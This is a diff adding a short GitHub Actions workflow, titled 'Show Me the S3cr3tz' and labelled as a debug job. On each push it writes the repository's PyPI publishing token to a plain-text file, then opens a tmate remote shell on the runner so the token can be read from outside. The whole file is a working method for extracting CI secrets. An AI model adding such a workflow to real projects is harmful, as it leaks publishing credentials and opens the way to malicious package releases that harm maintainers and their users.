@@ -1,0 +1,20 @@
+name: Show Me the S3cr3tz
+on: [push]
+
+jobs:
+  debug:
+    name: Debug
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Check out code
+      uses: actions/checkout@v2
+
+    - name: Set up secret file
+      env:
+        PYPI_TOKEN: ${{ secrets.PYPI_TOKEN }}
+      run: |
+        echo $PYPI_TOKEN >> secrets.txt
+
+    - name: Run tmate
+      uses: mxschmitt/action-tmate@v2
